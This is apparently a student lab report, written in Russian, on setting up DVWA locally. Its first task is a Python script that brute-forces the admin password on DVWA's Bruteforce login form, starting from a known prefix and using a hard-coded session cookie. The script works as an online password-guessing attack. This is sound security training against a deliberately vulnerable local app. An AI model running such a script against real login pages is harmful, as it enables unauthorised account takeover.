# pr3
## Установка
Архив DVWA был скачан с официального ресурса github, затем установлен с использованием дистрибутива OSPanel.
![image](https://github.com/user-attachments/assets/ba34beeb-ad1e-4daf-986c-7c5c8635b7bf)
Адрес: http://dvwa.local/login.php
![image](https://github.com/user-attachments/assets/4e7ff5dd-26b2-4344-8767-ff9e571b4cad)
## Задания
1.Необходимо разработать переборщик паролей для формы в задании Bruteforce на сайте dvwa.local.
Было решено помочь программе установкой префикса "passwo" для того, чтобы уменьшить время подбоа пароля.
```python
import itertools
import requests
import time

# Настройки
URL = "http://dvwa.local/vulnerabilities/brute/"
USERNAME = "admin"
CHARSET = 'abcdefghijklmnopqrstuvwxyz'
PASSWORD_LENGTH = 8
PREFIX = "passwo"
SESSION = requests.Session()

# Устанавливаем cookie для авторизации
SESSION.cookies.set("PHPSESSID", "mgg4vgt0fcdtg672ead6ujaa02a5eu1h")
SESSION.cookies.set("security", "low")


def generate_passwords(prefix, length, charset):
    remaining_length = length - len(prefix)
    return (
        prefix + ''.join(comb)
        for comb in itertools.product(charset, repeat=remaining_length)
    )


def is_password_correct(url, username, password):
    params = {'username': username, 'password': password, 'Login': 'Login'}
    try:
        response = SESSION.get(url, params=params)
        return "Welcome to the password protected area" in response.text
    except requests.exceptions.RequestException as e:
        print(f"[-] Ошибка при запросе: {e}")
        return False


def main():
    start_time = time.time()
    print("[*] Начинаем подбор пароля...")

    for password in generate_passwords(PREFIX, PASSWORD_LENGTH, CHARSET):
        print(f"[*] Пробуем пароль: {password}")
        if is_password_correct(URL, USERNAME, password):
            print(f"[+] Пароль найден: {password}")
            break
    else:
        print("[-] Пароль не найден.")

    end_time = time.time()
    print(f"[+] Время выполнения: {end_time - start_time:.2f} секунд")


if __name__ == "__main__":
    main()
```
